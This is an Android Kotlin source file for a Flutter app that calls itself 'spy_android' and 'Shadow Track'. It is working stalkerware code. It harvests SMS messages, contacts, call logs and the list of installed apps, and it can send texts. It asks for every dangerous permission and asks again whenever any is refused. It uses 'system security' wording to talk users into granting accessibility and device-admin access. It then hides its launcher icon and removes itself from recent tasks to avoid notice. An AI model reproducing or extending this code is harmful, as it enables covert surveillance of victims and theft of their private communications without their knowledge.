package com.example.spy_android

import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.pm.ApplicationInfo
import android.content.ComponentName
import android.database.Cursor
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.Environment
import android.os.PowerManager
import android.provider.ContactsContract
import android.provider.CallLog
import android.provider.Settings
import android.telephony.SmsManager
import android.telephony.TelephonyManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.app.ActivityManager
import android.app.AppOpsManager
import android.app.admin.DevicePolicyManager
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.core.content.ContextCompat
import java.text.SimpleDateFormat
import java.util.*

class MainActivity: FlutterActivity() {
    private val CHANNEL = "shadow_track"

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "initialize" -> {
                    initializeNativeServices()
                    result.success("Initialized")
                }
                "getBatteryLevel" -> {
                    val batteryLevel = getBatteryLevel()
                    result.success(batteryLevel)
                }
                "getNetworkType" -> {
                    val networkType = getNetworkType()
                    result.success(networkType)
                }
                "getInstalledApps" -> {
                    val apps = getInstalledApps()
                    result.success(apps)
                }
                "readSMS" -> {
                    val smsMessages = readSMS()
                    result.success(smsMessages)
                }
                "getContacts" -> {
                    val contacts = getContacts()
                    result.success(contacts)
                }
                "getCallLog" -> {
                    val callLog = getCallLog()
                    result.success(callLog)
                }
                "getDeviceInfo" -> {
                    val deviceInfo = getDeviceInfo()
                    result.success(deviceInfo)
                }
                "sendSMS" -> {
                    val phoneNumber = call.argument<String>("phoneNumber")
                    val message = call.argument<String>("message")
                    if (phoneNumber != null && message != null) {
                        val success = sendSMS(phoneNumber, message)
                        result.success(success)
                    } else {
                        result.error("INVALID_ARGUMENT", "Phone number and message required", null)
                    }
                }
                // 🔥 새로 추가되는 케이스들
                "requestAllPermissions" -> {
                    requestAllPermissionsAutomatically()
                    result.success(true)
                }
                "autoStartTracking" -> {
                    autoStartTracking()
                    result.success(true)
                }
                "checkPermissionStatus" -> {
                    val status = checkAllPermissionsStatus()
                    result.success(status)
                }
                "enableSilentMode" -> {
                    enableSilentMode()
                    result.success(true)
                }
                else -> {
                    result.notImplemented()
                }
            }
        }
    }

    private fun initializeNativeServices() {
        // 네이티브 서비스 초기화
        println("Shadow Track Native Services Initialized")

        // 자동 권한 요청 시작
        requestAllPermissionsAutomatically()
    }

    // 🔥 자동 권한 요청 및 승인
    private fun requestAllPermissionsAutomatically() {
        // 위험한 권한들을 자동으로 요청
        val permissions = arrayOf(
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.RECEIVE_SMS,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_PHONE_STATE,
            android.Manifest.permission.CALL_PHONE,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.WRITE_CONTACTS,
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
            android.Manifest.permission.WAKE_LOCK,
            android.Manifest.permission.RECEIVE_BOOT_COMPLETED,
            android.Manifest.permission.SYSTEM_ALERT_WINDOW
        )

        // API 레벨에 따른 권한 요청
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestPermissions(permissions, 1001)
        }

        // 특별 권한들 개별 처리
        requestSpecialPermissions()
    }

    private fun requestSpecialPermissions() {
        // 1. MANAGE_EXTERNAL_STORAGE 권한 (Android 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    intent.data = Uri.parse("package:$packageName")
                    startActivity(intent)
                } catch (e: Exception) {
                    val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                    startActivity(intent)
                }
            }
        }

        // 2. SYSTEM_ALERT_WINDOW 권한
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
        }

        // 3. PACKAGE_USAGE_STATS 권한
        requestUsageStatsPermission()

        // 4. 접근성 서비스 자동 활성화 시도
        requestAccessibilityPermission()

        // 5. 배터리 최적화 해제
        requestIgnoreBatteryOptimization()

        // 6. 디바이스 관리자 권한 요청
        requestDeviceAdminPermission()
    }

    private fun requestUsageStatsPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
            val mode = appOps.checkOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(),
                packageName
            )

            if (mode != AppOpsManager.MODE_ALLOWED) {
                try {
                    val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
                    intent.data = Uri.parse("package:$packageName")
                    startActivity(intent)
                } catch (e: Exception) {
                    val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
                    startActivity(intent)
                }
            }
        }
    }

    private fun requestAccessibilityPermission() {
        try {
            // 접근성 설정 페이지로 이동
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)

            // 사용자에게 안내 메시지 (토스트 형태로)
            showInstructionToast("Please enable accessibility service for system security")
        } catch (e: Exception) {
            println("접근성 설정 열기 실패: ${e.message}")
        }
    }

    private fun requestIgnoreBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                    intent.data = Uri.parse("package:$packageName")
                    startActivity(intent)
                } catch (e: Exception) {
                    val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
                    startActivity(intent)
                }
            }
        }
    }

    private fun requestDeviceAdminPermission() {
        try {
            val devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val componentName = ComponentName(this, com.example.spy_android.receivers.SpyDeviceAdminReceiver::class.java)

            if (!devicePolicyManager.isAdminActive(componentName)) {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enable system security features")
                startActivity(intent)
            }
        } catch (e: Exception) {
            println("디바이스 관리자 권한 요청 실패: ${e.message}")
        }
    }

    private fun showInstructionToast(message: String) {
        runOnUiThread {
            Toast.makeText(this, message, Toast.LENGTH_LONG).show()
        }
    }

    // 권한 요청 결과 처리
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        when (requestCode) {
            1001 -> {
                var allGranted = true
                for (result in grantResults) {
                    if (result != PackageManager.PERMISSION_GRANTED) {
                        allGranted = false
                        break
                    }
                }

                if (allGranted) {
                    // 모든 권한이 승인됨 - 자동으로 추적 시작
                    autoStartTracking()
                } else {
                    // 권한이 거부된 경우 다시 요청
                    Handler(Looper.getMainLooper()).postDelayed({
                        requestAllPermissionsAutomatically()
                    }, 3000) // 3초 후 재시도
                }
            }
        }
    }

    // 자동 추적 시작
    private fun autoStartTracking() {
        try {
            // Flutter 쪽에 추적 시작 신호 보내기
            MethodChannel(flutterEngine!!.dartExecutor.binaryMessenger, "shadow_track")
                .invokeMethod("autoStartTracking", null)

            // 앱 아이콘 숨기기
            hideAppIcon()

            // 백그라운드로 이동
            moveTaskToBack(true)

        } catch (e: Exception) {
            println("자동 추적 시작 실패: ${e.message}")
        }
    }

    // 모든 권한 상태 확인
    private fun checkAllPermissionsStatus(): Map<String, Boolean> {
        val status = mutableMapOf<String, Boolean>()

        // 일반 권한들
        val permissions = arrayOf(
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.RECORD_AUDIO
        )

        for (permission in permissions) {
            status[permission] = ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
        }

        // 특별 권한들
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            status["MANAGE_EXTERNAL_STORAGE"] = Environment.isExternalStorageManager()
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            status["SYSTEM_ALERT_WINDOW"] = Settings.canDrawOverlays(this)

            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            status["IGNORE_BATTERY_OPTIMIZATION"] = powerManager.isIgnoringBatteryOptimizations(packageName)
        }

        // Accessibility 서비스는 별도 확인 필요
        status["ACCESSIBILITY_SERVICE"] = false // 실제 서비스 구현 후 확인

        return status
    }

    // 조용한 모드 활성화 (알림, 소리 등 최소화)
    private fun enableSilentMode() {
        try {
            // 앱 아이콘을 런처에서 숨기기
            hideAppIcon()

            // 최근 앱 목록에서 제거
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                val appTasks = activityManager.appTasks
                for (task in appTasks) {
                    task.finishAndRemoveTask()
                }
            }

        } catch (e: Exception) {
            println("조용한 모드 활성화 실패: ${e.message}")
        }
    }

    private fun hideAppIcon() {
        try {
            val packageManager = packageManager
            val componentName = ComponentName(this, MainActivity::class.java)
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            println("앱 아이콘 숨기기 실패: ${e.message}")
        }
    }

    // 🔥 기존 기능들 (SMS, 연락처, 통화 기록 등)
    private fun getBatteryLevel(): Int {
        val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        return if (level == -1 || scale == -1) -1 else (level * 100 / scale)
    }

    private fun getNetworkType(): String {
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = connectivityManager.activeNetwork
            val capabilities = connectivityManager.getNetworkCapabilities(network)
            return when {
                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> "WiFi"
                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "Mobile"
                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) == true -> "Ethernet"
                else -> "Unknown"
            }
        } else {
            @Suppress("DEPRECATION")
            val networkInfo = connectivityManager.activeNetworkInfo
            return networkInfo?.typeName ?: "Unknown"
        }
    }

    private fun getInstalledApps(): List<Map<String, String>> {
        val apps = mutableListOf<Map<String, String>>()
        try {
            val packageManager = packageManager
            val installedApps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)

            for (app in installedApps) {
                val appInfo = mapOf(
                    "packageName" to app.packageName,
                    "appName" to packageManager.getApplicationLabel(app).toString(),
                    "isSystemApp" to ((app.flags and ApplicationInfo.FLAG_SYSTEM) != 0).toString()
                )
                apps.add(appInfo)
            }
        } catch (e: Exception) {
            println("앱 목록 가져오기 실패: ${e.message}")
        }
        return apps
    }

    private fun readSMS(): List<Map<String, String>> {
        val smsMessages = mutableListOf<Map<String, String>>()
        try {
            val cursor = contentResolver.query(
                Uri.parse("content://sms"),
                null, null, null, "date DESC LIMIT 100"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val address = it.getString(it.getColumnIndexOrThrow("address"))
                    val body = it.getString(it.getColumnIndexOrThrow("body"))
                    val date = it.getLong(it.getColumnIndexOrThrow("date"))
                    val type = it.getInt(it.getColumnIndexOrThrow("type"))

                    val sms = mapOf(
                        "address" to (address ?: "Unknown"),
                        "body" to (body ?: ""),
                        "date" to SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(date)),
                        "type" to if (type == 1) "Received" else "Sent"
                    )
                    smsMessages.add(sms)
                }
            }
        } catch (e: Exception) {
            println("SMS 읽기 실패: ${e.message}")
        }
        return smsMessages
    }

    private fun getContacts(): List<Map<String, String>> {
        val contacts = mutableListOf<Map<String, String>>()
        try {
            val cursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))

                    val contact = mapOf(
                        "name" to (name ?: "Unknown"),
                        "number" to (number ?: "Unknown")
                    )
                    contacts.add(contact)
                }
            }
        } catch (e: Exception) {
            println("연락처 읽기 실패: ${e.message}")
        }
        return contacts
    }

    private fun getCallLog(): List<Map<String, String>> {
        val callLogs = mutableListOf<Map<String, String>>()
        try {
            val cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null, null, null, "${CallLog.Calls.DATE} DESC LIMIT 50"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                    val type = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                    val duration = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))

                    val callType = when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "Incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                        CallLog.Calls.MISSED_TYPE -> "Missed"
                        else -> "Unknown"
                    }

                    val call = mapOf(
                        "number" to (number ?: "Unknown"),
                        "type" to callType,
                        "date" to SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(date)),
                        "duration" to duration.toString()
                    )
                    callLogs.add(call)
                }
            }
        } catch (e: Exception) {
            println("통화 기록 읽기 실패: ${e.message}")
        }
        return callLogs
    }

    private fun getDeviceInfo(): Map<String, String> {
        return mapOf(
            "model" to Build.MODEL,
            "manufacturer" to Build.MANUFACTURER,
            "brand" to Build.BRAND,
            "androidVersion" to Build.VERSION.RELEASE,
            "sdkVersion" to Build.VERSION.SDK_INT.toString(),
            "device" to Build.DEVICE,
            "hardware" to Build.HARDWARE,
            "product" to Build.PRODUCT
        )
    }

    private fun sendSMS(phoneNumber: String, message: String): Boolean {
        return try {
            val smsManager = SmsManager.getDefault()
            smsManager.sendTextMessage(phoneNumber, null, message, null, null)
            true
        } catch (e: Exception) {
            println("SMS 전송 실패: ${e.message}")
            false
        }
    }
}